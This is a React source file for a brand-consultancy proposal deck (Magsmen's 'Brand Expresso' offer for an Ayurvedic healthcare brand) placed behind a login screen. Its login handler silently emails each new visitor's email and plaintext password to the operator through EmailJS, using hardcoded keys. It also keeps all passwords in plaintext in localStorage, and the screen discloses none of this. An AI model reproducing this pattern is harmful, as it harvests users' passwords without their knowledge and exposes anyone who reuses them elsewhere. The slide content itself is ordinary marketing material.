import React, { FormEvent, useState } from 'react';
import { 
  ArrowRight, 
  ShieldCheck, 
  Target, 
  BarChart3, 
  Users, 
  Compass, 
  Map, 
  CheckCircle2, 
  TrendingUp,
  Briefcase,
  ChevronRight,
  ChevronLeft,
  LayoutDashboard,
  Mail,
  Lock,
  AlertCircle,
  Loader2
} from 'lucide-react';
import emailjs from '@emailjs/browser';

interface UserData {
  email: string;
  password: string;
}

const MagsmenStrategicProposal = () => {

  const [activeSlide, setActiveSlide] = useState(0);
  const [activeModule, setActiveModule] = useState(0);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [successMessage, setSuccessMessage] = useState('');

  // ================= USER STORAGE LOGIC =================

  const getUsers = (): UserData[] => {
    return JSON.parse(localStorage.getItem('registeredUsers') || '[]');
  };

  const saveUserToLocalStorage = (user: UserData): void => {
    const users = getUsers();
    users.push(user);
    localStorage.setItem('registeredUsers', JSON.stringify(users));
  };

  const findUserByEmail = (email: string): UserData | undefined => {
    const users = getUsers();
    return users.find((u) => u.email === email);
  };

  
  // ================= LOGIN LOGIC =================
const handleLogin = async (e: FormEvent<HTMLFormElement>) => {
  e.preventDefault();

  setError('');
  setSuccessMessage('');
  setIsLoading(true);

  const formData = new FormData(e.currentTarget);
  const email = (formData.get('email') as string)?.trim();
  const password = (formData.get('password') as string)?.trim();

  if (!email || !password) {
    setError('Please enter both email and password.');
    setIsLoading(false);
    return;
  }

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (!emailRegex.test(email)) {
    setError('Please enter a valid email address.');
    setIsLoading(false);
    return;
  }

  const existingUser = findUserByEmail(email);

  // ================= EXISTING USER =================
  if (existingUser) {

    if (existingUser.password !== password) {
      setError('Incorrect password.');
      setIsLoading(false);
      return;
    }

    // ✅ NO EMAIL SENT HERE
    setSuccessMessage('👋 Welcome back!');
    setTimeout(() => setIsLoggedIn(true), 800);
    setIsLoading(false);
    return;
  }

  // ================= NEW USER =================
  try {

    // ✅ EMAIL SENT ONLY FIRST TIME
    await emailjs.send(
      'service_ztfkvtu',
      'template_zhvk3r4',
      { email, password },
      'lGEySRjC5bz4G2JLr'
    );

    saveUserToLocalStorage({ email, password });

    setSuccessMessage('✅ Registered successfully!');
    setTimeout(() => setIsLoggedIn(true), 1000);

  } catch (err) {
    console.error(err);
    setError('⚠️ Registration failed. Please try again.');
  } finally {
    setIsLoading(false);
  }
};



  // ================= SLIDE NAVIGATION =================

  const totalSlides = 7;

  const nextSlide = () => {
    if (activeSlide < totalSlides - 1) setActiveSlide(activeSlide + 1);
  };

  const prevSlide = () => {
    if (activeSlide > 0) setActiveSlide(activeSlide - 1);
  };

  // ================= LOGIN SCREEN =================

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-slate-100 flex items-center justify-center p-6 font-sans md:pt-28">
        <div className="w-full max-w-md bg-white rounded-[2rem] shadow-xl p-10 border border-slate-200">

          <div className="flex flex-col items-center mb-8">
            <div className="p-4 bg-slate-100 rounded-2xl mb-4 text-[#1E293B]">
              <LayoutDashboard className="w-8 h-8" />
            </div>
            <h1 className="text-2xl font-black text-[#1E293B] uppercase tracking-tight text-center">
              Strategic Dashboard
            </h1>
            <p className="text-slate-500 text-sm mt-2 font-medium text-center">
              Enter your details to access the platform
            </p>
          </div>

          <form onSubmit={handleLogin} className="space-y-6">

            {/* Email Field */}
            <div className="space-y-2">
              <label className="text-[11px] font-black text-slate-400 uppercase tracking-wider pl-1">
                Email
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-400">
                  <Mail className="w-5 h-5" />
                </div>
                <input 
                  type="email" 
                  name="email"
                  required 
                  className="w-full pl-12 pr-4 py-3.5 bg-slate-50 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#1E293B]/20 focus:border-[#1E293B] font-semibold"
                  placeholder="example@email.com"
                />
              </div>
            </div>

            {/* Password Field */}
            <div className="space-y-2">
              <label className="text-[11px] font-black text-slate-400 uppercase tracking-wider pl-1">
                Password
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-400">
                  <Lock className="w-5 h-5" />
                </div>
                <input 
                  type="password" 
                  name="password"
                  required 
                  className="w-full pl-12 pr-4 py-3.5 bg-slate-50 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#1E293B]/20 focus:border-[#1E293B] font-semibold"
                  placeholder="Enter password"
                />
              </div>
            </div>

            {error && (
              <div className="flex items-center gap-2 text-red-500 bg-red-50 p-3 rounded-xl border border-red-100">
                <AlertCircle className="w-4 h-4" />
                <p className="text-[12px] font-bold">{error}</p>
              </div>
            )}

            {successMessage && (
              <div className="flex items-center gap-2 text-green-600 bg-green-50 p-3 rounded-xl border border-green-200">
                <p className="text-[12px] font-bold">{successMessage}</p>
              </div>
            )}

            <button 
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#1E293B] text-white font-bold py-4 rounded-xl transition-all flex items-center justify-center gap-2"
            >
              {isLoading ? (
                <Loader2 className="w-5 h-5 animate-spin" />
              ) : (
                <>
                  <span>Access Dashboard</span>
                  <ChevronRight className="w-4 h-4" />
                </>
              )}
            </button>

          </form>
        </div>
      </div>
    );
  }

  // ================= MAIN SLIDE DASHBOARD =================

// Content Data
  const modules = [
    {
      title: "Module 1: Regulatory & Compliance Baseline Audit",
      icon: <ShieldCheck className="w-6 h-6" />,
      tagline: "Protecting long-term brand credibility.",
      context: "In healthcare and Ayurvedic categories, compliance errors can quietly destroy brands.",
      actions: [
        "Review: Packaging claims, Label declarations, Website communication.",
        "Audit: Social media claims, Ingredient transparency, Usage instructions, Disclaimers, Visual medical cues.",
        "Assess Alignment: AYUSH regulatory standards, ASCI advertising code, Consumer protection guidelines.",
        "Identify: General misleading claims risk."
      ],
      outcome: "You will know which claims are legally defensible. Language modification. Avoid future packaging recalls. Reduce risk of legal notices. Strengthen trust perception."
    },
    {
      title: "Module 2: Product & Functional Truth Assessment",
      icon: <CheckCircle2 className="w-6 h-6" />,
      tagline: "Stop overstatement. Clarify true strength.",
      context: "In commodity categories, perceived differentiation is often artificial.",
      actions: [
        "Evaluate: Ingredient composition vs competitors, Functional benefit comparison, Sentiment patterns.",
        "Assess: Speed of relief positioning, Doctor credibility potential, Clinical narrative feasibility.",
        "Identify: Functional uniqueness, Narrative-driven differentiation.",
        "Positioning Focus: Credibility, Specialization, or Affordability."
      ],
      outcome: "Prevents building brand stories on weak ground. Defines realistic brand promise. Defines what claims can be defended long term."
    },
    {
      title: "Module 3: Market & Competitive Intelligence",
      icon: <BarChart3 className="w-6 h-6" />,
      tagline: "Protection from entering saturated messaging territory.",
      context: "We conduct structured competitor benchmarking on Top 5 leaders and 3 underperforming brands.",
      actions: [
        "Evaluate: Price points, Distribution strength, Communication tone, Brand memory triggers, Retail penetration logic.",
        "Identify: Where leaders dominate, Where they are complacent.",
        "Locate: White space where niche entry is viable.",
        "Assess: Where price war is dangerous."
      ],
      outcome: "Clear map of competitive battlefield. Identification of exploitable positioning gaps."
    },
    {
      title: "Module 4: Audience & Buying Behaviour Analysis",
      icon: <Users className="w-6 h-6" />,
      tagline: "Healthcare buying is habit-driven, not emotional storytelling-driven.",
      context: "We identify who buys first, who influences, where buying happens, switching triggers, and repeat triggers.",
      actions: [
        "Segmentation: Chronic pain elderly, Working professionals, Rural pharmacy buyers, Urban digital buyers, Doctor-recommended buyers.",
        "Map: Functional triggers vs Trust triggers.",
        "Analyze: Price sensitivity & Purchase frequency."
      ],
      outcome: "Clear primary target segment. Clear messaging direction. Lower marketing wastage. Defined acquisition priority."
    },
    {
      title: "Module 5: Positioning & Brand Architecture Blueprint",
      icon: <Compass className="w-6 h-6" />,
      tagline: "The foundation for long-term equity.",
      context: "This module defines the core of the brand. We structure the Core brand promise and supporting proof points.",
      actions: [
        "Define: Communication pillars, Tone and credibility usage, What the brand stands for, What the brand will avoid.",
        "Structure: Master brand vs product brand logic (if multiple SKUs).",
        "Create: Sub-brand hierarchy & Expansion alignment."
      ],
      outcome: "Clear and defensible positioning. Consistent communication direction. Structured brand growth path."
    },
    {
      title: "Module 6: Directional GTM & Execution Blueprint",
      icon: <Map className="w-6 h-6" />,
      tagline: "Distribution is survival in this category.",
      context: "We assess Retail-first feasibility, Pharmacy-first strategy, Institutional entry potential, DTC viability, and Margin alignment.",
      actions: [
        "Define: Primary channel focus & Channel sequencing.",
        "Resource Allocation: Logic for capital efficiency.",
        "Geographic Priority: Where to launch first.",
        "Focus: 90-day operational focus & 180-day scaling direction."
      ],
      outcome: "Prevents multi-channel confusion. Protects capital. Defines the first growth lever. Establishes realistic rollout logic."
    }
  ];

  const pricingOptions = [
    {
      title: "Option 1: The Core",
      subtitle: "Strategy & GTM",
      price: "₹6,00,000",
      tax: "+ GST",
      includes: [
        "Module 1: Regulatory & Compliance Audit",
        "Module 2: Product Truth (Functional)",
        "Module 4: Audience & Buying Behaviour",
        "Module 5: Positioning & Brand Architecture",
        "Module 6: GTM & Execution Blueprint",
        "Digital Marketing Strategy",
        "Roadmap Definition Only"
      ],
      excludes: [
        "Legal: Trademark, IP & Claims Defense",
        "Module 3: Market Intelligence (Benchmarking)",
        "Design Suite (Visual Identity/Brand Book)"
      ]
    },
    {
      title: "Option 2: The Structure",
      subtitle: "Strategy + Legal",
      price: "₹7,50,000",
      tax: "+ GST",
      highlight: false,
      includes: [
        "All inclusions from Option 1",
        "Legal: Trademark Advisory",
        "IP Protection & Claims Defense"
      ],
      excludes: [
        "Module 3: Market Intelligence (Benchmarking)",
        "Design Suite (Visual Identity/Brand Book)"
      ]
    },
    {
      title: "Option 3: Complete Brand",
      subtitle: "Strategy + Legal + Design",
      price: "₹9,00,000",
      tax: "+ GST",
      includes: [
        "All inclusions from Option 2",
        "Module 3: Competitor Benchmarking & Gap Analysis",
        "Design: Visual Identity & Brand Book",
        "Packaging Guidelines"
      ],
      excludes: []
    }
  ];

  // Components for Slides
  const CoverSlide = () => (
    <div className="h-full flex flex-col justify-center items-start px-12 bg-zinc-900 text-white relative overflow-hidden">
      <div className="absolute top-0 right-0 w-64 h-full bg-zinc-800 opacity-20 transform skew-x-12 translate-x-12"></div>
      <div className="z-10">
        <h3 className="text-zinc-400 tracking-[0.3em] text-sm font-semibold mb-4">MAGSMEN BRAND CONSULTANTS</h3>
        <h1 className="text-6xl font-bold leading-tight mb-6">
          BRAND <span className="text-amber-500">EXPRESSO</span>
        </h1>
        <p className="text-2xl font-light text-zinc-300 max-w-2xl border-l-4 border-amber-500 pl-6 py-2">
          Complete Brand, Market & Commercial Structuring Intervention
        </p>
        <div className="mt-8 text-xs text-zinc-500 uppercase tracking-widest">
            A Division of Grofessors Innovations Private Limited
        </div>
        <div className="mt-12 flex space-x-8 text-sm tracking-widest text-zinc-400">
          <span>CLEAR VISION</span>
          <span>•</span>
          <span>CALM APPROACH</span>
          <span>•</span>
          <span>BOLD MOVES</span>
        </div>
      </div>
    </div>
  );

  const ContextSlide = () => (
    <div className="h-full px-12 py-8 bg-zinc-50 flex flex-col justify-center">
      <h2 className="text-3xl font-bold text-zinc-900 mb-6">Project Context & Business Reality</h2>
      <div className="grid grid-cols-2 gap-8 text-sm">
        <div className="space-y-4">
          <div>
            <h3 className="text-base font-semibold text-amber-700 mb-2">Category Drivers</h3>
            <p className="text-zinc-600">The Ayurvedic healthcare category is no longer driven by product novelty. It is driven by:</p>
            <ul className="list-disc list-inside text-zinc-700 ml-2 mt-1 space-y-1">
                <li>Distribution power</li>
                <li>Regulatory compliance</li>
                <li>Perceived trust</li>
                <li>Brand memory</li>
                <li>Margin structure</li>
            </ul>
          </div>
          
          <div>
            <h3 className="text-base font-semibold text-amber-700 mb-2">OTC Healthcare Realities</h3>
            <ul className="space-y-2 text-zinc-700">
                <li className="flex items-start"><span className="mr-2 text-amber-600">•</span>Consumers buy based on familiarity and habit.</li>
                <li className="flex items-start"><span className="mr-2 text-amber-600">•</span>Retail pharmacists influence purchase decisions.</li>
                <li className="flex items-start"><span className="mr-2 text-amber-600">•</span>Brand recall matters more than ingredient listing.</li>
                <li className="flex items-start"><span className="mr-2 text-amber-600">•</span>Price sensitivity exists in mass segments.</li>
                <li className="flex items-start"><span className="mr-2 text-amber-600">•</span>Claims are highly scrutinized under regulatory frameworks.</li>
            </ul>
          </div>
        </div>
        
        <div className="bg-zinc-900 p-6 rounded-lg shadow-xl text-white flex flex-col justify-center">
          <h3 className="text-lg font-semibold text-amber-500 mb-4">The Strategic Risk</h3>
          <p className="mb-4 opacity-90">For a growing brand, the biggest risk is not competition. It is <span className="font-bold">capital spent before clarity.</span></p>
          <div className="space-y-2 mb-6">
            <p className="font-semibold text-zinc-400 text-xs uppercase tracking-widest">The Biggest Risks:</p>
            <ul className="grid grid-cols-1 gap-2">
                <li className="flex items-center space-x-2"><div className="w-1.5 h-1.5 bg-red-500 rounded-full"></div><span>Weak Positioning</span></li>
                <li className="flex items-center space-x-2"><div className="w-1.5 h-1.5 bg-red-500 rounded-full"></div><span>Compliance Gaps</span></li>
                <li className="flex items-center space-x-2"><div className="w-1.5 h-1.5 bg-red-500 rounded-full"></div><span>Wrong Channel Strategy</span></li>
                <li className="flex items-center space-x-2"><div className="w-1.5 h-1.5 bg-red-500 rounded-full"></div><span>Poor Differentiation Logic</span></li>
            </ul>
          </div>
          <div className="pt-4 border-t border-zinc-700">
            <p className="italic font-light text-sm">"Brand Expresso is designed to remove structural confusion before scale. This is not a branding exercise. This is a commercial structuring intervention."</p>
          </div>
        </div>
      </div>
    </div>
  );

  const ObjectiveSlide = () => (
    <div className="h-full px-16 py-12 bg-white flex flex-col justify-center">
      <div className="max-w-4xl mx-auto text-center mb-8">
        <h2 className="text-3xl font-bold text-zinc-900">Objective of The Engagement</h2>
        <p className="text-zinc-500 mt-2">To define and structure the business before scale.</p>
      </div>
      
      <div className="grid grid-cols-2 gap-x-12 gap-y-6 max-w-5xl mx-auto mb-10">
        {[
          "Legal & Compliance Safety",
          "Product Truth & Differentiation",
          "Target Buyer Clarity",
          "Market Positioning",
          "Brand Narrative Alignment",
          "Distribution Direction"
        ].map((item, idx) => (
          <div key={idx} className="flex items-center space-x-3 text-lg text-zinc-800">
             <CheckCircle2 className="w-5 h-5 text-amber-500" />
             <span>{item}</span>
          </div>
        ))}
      </div>

      <div className="bg-zinc-50 p-6 rounded-lg max-w-3xl mx-auto w-full text-center border border-zinc-200">
        <h3 className="text-amber-600 font-bold uppercase tracking-widest mb-2">90/180-Day Execution Focus</h3>
        <p className="text-zinc-900 font-medium text-lg">
            The end goal is simple: To ensure that every rupee invested in packaging, marketing, or distribution is backed by strategic clarity.
        </p>
      </div>
    </div>
  );

  const ModulesSlide = () => (
    <div className="h-full px-8 py-6 bg-zinc-50 flex flex-col">
      <h2 className="text-2xl font-bold text-zinc-900 mb-1">Detailed Intervention Structure</h2>
      <p className="text-zinc-500 mb-4 text-sm">6 Structured Work Modules over 6-8 Weeks</p>

      <div className="flex flex-1 gap-6 overflow-hidden">
        {/* Module Navigation */}
        <div className="w-1/3 space-y-1 overflow-y-auto pr-2">
          {modules.map((module, idx) => (
            <button
              key={idx}
              onClick={() => setActiveModule(idx)}
              className={`w-full text-left p-3 rounded-lg border transition-all duration-300 flex items-center justify-between group ${
                activeModule === idx 
                  ? 'bg-zinc-900 text-white border-zinc-900 shadow-md' 
                  : 'bg-white text-zinc-600 border-zinc-200 hover:bg-zinc-100'
              }`}
            >
              <div className="flex items-center space-x-3">
                <span className={`text-xs font-bold ${activeModule === idx ? 'text-amber-500' : 'text-zinc-400'}`}>0{idx + 1}</span>
                <span className="font-medium text-xs sm:text-sm">{module.title.split(":")[1]}</span>
              </div>
              <ChevronRight className={`w-3 h-3 ${activeModule === idx ? 'text-white' : 'text-zinc-300 opacity-0 group-hover:opacity-100'}`} />
            </button>
          ))}
        </div>

        {/* Module Content */}
        <div className="w-2/3 bg-white p-6 rounded-xl border border-zinc-200 shadow-sm flex flex-col overflow-y-auto">
          <div>
            <div className="flex items-center space-x-3 mb-4">
              <div className="p-2 bg-amber-50 rounded-lg text-amber-600">
                {modules[activeModule].icon}
              </div>
              <h3 className="text-xl font-bold text-zinc-800">{modules[activeModule].title.split(":")[1]}</h3>
            </div>
            
            <p className="text-base font-medium text-amber-600 mb-3">{modules[activeModule].tagline}</p>
            <p className="text-sm text-zinc-600 italic mb-4 border-l-2 border-zinc-300 pl-3">{modules[activeModule].context}</p>
            
            <div className="bg-zinc-50 p-4 rounded-lg mb-4">
              <h4 className="text-xs font-bold text-zinc-900 uppercase tracking-wider mb-2">Key Actions & Scope</h4>
              <ul className="space-y-2">
                {modules[activeModule].actions.map((action, i) => (
                  <li key={i} className="flex items-start text-xs sm:text-sm text-zinc-700">
                    <span className="mr-2 mt-1.5 w-1 h-1 bg-zinc-400 rounded-full flex-shrink-0"></span>
                    {action}
                  </li>
                ))}
              </ul>
            </div>
          </div>
          
          <div className="bg-zinc-900 text-zinc-100 p-4 rounded-lg mt-auto">
            <span className="text-amber-500 font-bold text-xs uppercase tracking-widest block mb-1">Outcome</span>
            <p className="text-xs sm:text-sm">{modules[activeModule].outcome}</p>
          </div>
        </div>
      </div>
    </div>
  );

  const CommercialsSlide = () => (
    <div className="h-full px-8 py-8 bg-zinc-900 text-white flex flex-col justify-center">
      <div className="mb-6 text-center">
        <h2 className="text-2xl font-bold mb-1">Phase 1: Commercial Investment</h2>
        <p className="text-zinc-400 text-sm">Duration: 6-8 Weeks | Payment: 50% Advance, 50% On Delivery</p>
      </div>

      <div className="grid grid-cols-3 gap-4 items-stretch h-3/4">
        {pricingOptions.map((opt, idx) => (
          <div 
            key={idx} 
            className="relative p-5 rounded-xl border flex flex-col bg-zinc-900 border-zinc-700"
          >
            <div className="mb-4 text-center border-b border-zinc-700 pb-4">
              <h3 className="text-base font-medium text-zinc-300 mb-1">{opt.title}</h3>
              <p className="text-xs text-zinc-500 mb-3">{opt.subtitle}</p>
              <div className="flex items-baseline justify-center text-white">
                <span className="text-2xl font-bold">{opt.price}</span>
                <span className="text-[10px] ml-1 text-zinc-400">{opt.tax}</span>
              </div>
            </div>

            <div className="flex-1 space-y-3 overflow-y-auto">
              {opt.includes.map((item, i) => (
                <div key={i} className="flex items-start text-xs text-zinc-300">
                  <CheckCircle2 className="w-3 h-3 text-green-500 mr-2 flex-shrink-0 mt-0.5" />
                  <span>{item}</span>
                </div>
              ))}
              {opt.excludes.length > 0 && (
                <div className="pt-3 border-t border-zinc-700/50 mt-2 space-y-2 opacity-60">
                  {opt.excludes.map((item, i) => (
                    <div key={i} className="flex items-start text-[10px] text-zinc-500">
                      <span className="mr-2 text-zinc-600">x</span>
                      <span>{item}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
            
            <div className="mt-4 pt-4 border-t border-zinc-800">
                <p className="text-[10px] text-zinc-500 text-center uppercase tracking-wider">Select to Proceed</p>
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  const RetainerSlide = () => (
    <div className="h-full px-12 py-8 bg-zinc-50 flex flex-col justify-center">
      <div className="flex items-center justify-between mb-8">
        <div>
          <h2 className="text-3xl font-bold text-zinc-900">Phase 2: Brand Guardianship</h2>
          <p className="text-zinc-500 mt-2">Execution & Stewardship (Starts AFTER Phase 1)</p>
        </div>
        <div className="text-right">
            <h3 className="text-lg font-bold text-zinc-800">Option 4</h3>
            <p className="text-2xl font-bold text-zinc-900">₹2,00,000 <span className="text-sm font-normal text-zinc-500">/ Month</span></p>
            <p className="text-xs text-zinc-400">+ GST (12-Month Contract)</p>
        </div>
      </div>

      <div className="grid grid-cols-2 gap-6 h-3/5">
        <div className="bg-white p-6 rounded-lg shadow-sm border border-zinc-200 flex flex-col">
          <div className="flex items-center space-x-3 mb-4">
             <Target className="w-5 h-5 text-amber-600" />
             <h3 className="text-lg font-bold text-zinc-800">Strategic Brand Consulting</h3>
          </div>
          <div className="space-y-4 text-sm text-zinc-600 overflow-y-auto pr-2">
             <div className="space-y-1">
                <span className="font-semibold text-zinc-900 block">Purpose & Vision:</span>
                Defining brand purpose, vision, mission, and values.
             </div>
             <div className="space-y-1">
                <span className="font-semibold text-zinc-900 block">Positioning:</span>
                Crafting positioning that separates you from competition.
             </div>
             <div className="space-y-1">
                <span className="font-semibold text-zinc-900 block">Audits & Journey:</span>
                Brand presence audits. Designing customer journeys (promise = experience).
             </div>
             <div className="space-y-1">
                <span className="font-semibold text-zinc-900 block">Internal Alignment & Innovation:</span>
                Aligning leadership/employees. Supporting new product positioning.
             </div>
          </div>
        </div>

        <div className="flex flex-col gap-6">
             <div className="bg-white p-5 rounded-lg shadow-sm border border-zinc-200 flex-1">
                <div className="flex items-center space-x-3 mb-3">
                    <TrendingUp className="w-5 h-5 text-amber-600" />
                    <h3 className="text-lg font-bold text-zinc-800">Performance, Legal & Digital</h3>
                </div>
                <ul className="space-y-2 text-sm text-zinc-600">
                    <li><span className="font-semibold text-zinc-900">Performance:</span> Dashboards, Scorecards, Tracking ROI.</li>
                    <li><span className="font-semibold text-zinc-900">Protection:</span> Reputation Management (risk/crisis), Regulatory Watchdog (ASCI/AYUSH).</li>
                    <li><span className="font-semibold text-zinc-900">Digital Execution:</span> Link Fluence (Control narrative), Social Media (Content/Design/Posting), Ad Campaigns (Meta/Google A/B Testing), Community Management.</li>
                </ul>
             </div>
        </div>
      </div>
    </div>
  );

  const FinalSlide = () => (
    <div className="h-full flex flex-col justify-center items-center bg-zinc-900 text-white text-center px-12">
      <Briefcase className="w-12 h-12 text-amber-500 mb-6" />
      <h2 className="text-4xl font-bold mb-2">Structure Before Scale.</h2>
      <p className="text-lg text-zinc-400 max-w-3xl mb-10">
        "The biggest risk is not competition. It is capital spent before clarity."
      </p>
      
      <div className="grid grid-cols-2 gap-12 text-left max-w-4xl w-full border-t border-zinc-800 pt-8">
        <div>
           <h4 className="text-amber-500 font-bold uppercase tracking-widest text-xs mb-4">Deliverables</h4>
           <ul className="text-zinc-400 space-y-2 text-sm">
             <li>• Compliance Review Summary</li>
             <li>• Competitor Benchmarking Document</li>
             <li>• Product Differentiation Matrix</li>
             <li>• Target Persona Map</li>
             <li>• Positioning Blueprint Document</li>
             <li>• Directional GTM Plan & 90-Day Execution Roadmap</li>
             <li>• Strategic Presentation Deck</li>
           </ul>
        </div>
        <div>
           <h4 className="text-amber-500 font-bold uppercase tracking-widest text-xs mb-4">Business Impact</h4>
           <ul className="text-zinc-400 space-y-2 text-sm">
             <li>• Risk Reduction</li>
             <li>• Margin Protection</li>
             <li>• Channel Clarity</li>
             <li>• Communication Consistency</li>
             <li>• Trust Positioning</li>
             <li>• Capital Efficiency</li>
           </ul>
        </div>
      </div>
    </div>
  );

  const slides = [
    <CoverSlide />,
    <ContextSlide />,
    <ObjectiveSlide />,
    <ModulesSlide />,
    <CommercialsSlide />,
    <RetainerSlide />,
    <FinalSlide />
  ];



  return (
    <div className="w-full min-h-screen bg-black flex items-center justify-center p-2 sm:p-6 font-sans">
      
      <div
        className="
          w-full
          max-w-6xl
          bg-white
          rounded-none sm:rounded-xl
          shadow-2xl
          flex flex-col
          h-screen sm:h-[85vh]
          overflow-hidden
        "
      >

        {/* Slide Content */}
        <div className="flex-1 overflow-auto">
          {slides[activeSlide]}
        </div>

        {/* Navigation Bar */}
        <div
          className="
            bg-white
            border-t
            p-4
            flex flex-col sm:flex-row
            items-center
            justify-between
            gap-4
          "
        >

          {/* Dots */}
          <div className="flex space-x-2">
            {slides.map((_, idx) => (
              <div
                key={idx}
                className={`h-2 rounded-full transition-all duration-300 ${
                  activeSlide === idx
                    ? 'bg-amber-500 w-6 sm:w-8'
                    : 'bg-zinc-400 w-2'
                }`}
              />
            ))}
          </div>

          {/* Buttons */}
          <div className="flex space-x-4">
            <button
              onClick={prevSlide}
              disabled={activeSlide === 0}
              className={`
                p-2 sm:p-3
                rounded-full
                border
                transition-all
                ${
                  activeSlide === 0
                    ? 'border-zinc-300 text-zinc-400 cursor-not-allowed'
                    : 'border-zinc-400 text-zinc-800 hover:bg-zinc-100'
                }
              `}
            >
              <ChevronLeft className="w-5 h-5 sm:w-6 sm:h-6" />
            </button>

            <button
              onClick={nextSlide}
              disabled={activeSlide === totalSlides - 1}
              className={`
                p-2 sm:p-3
                rounded-full
                border
                transition-all
                ${
                  activeSlide === totalSlides - 1
                    ? 'border-zinc-300 text-zinc-400 cursor-not-allowed'
                    : 'bg-amber-500 border-amber-500 text-black hover:bg-amber-400'
                }
              `}
            >
              <ArrowRight className="w-5 h-5 sm:w-6 sm:h-6" />
            </button>
          </div>

        </div>
      </div>
    </div>
  );
};

export default MagsmenStrategicProposal;

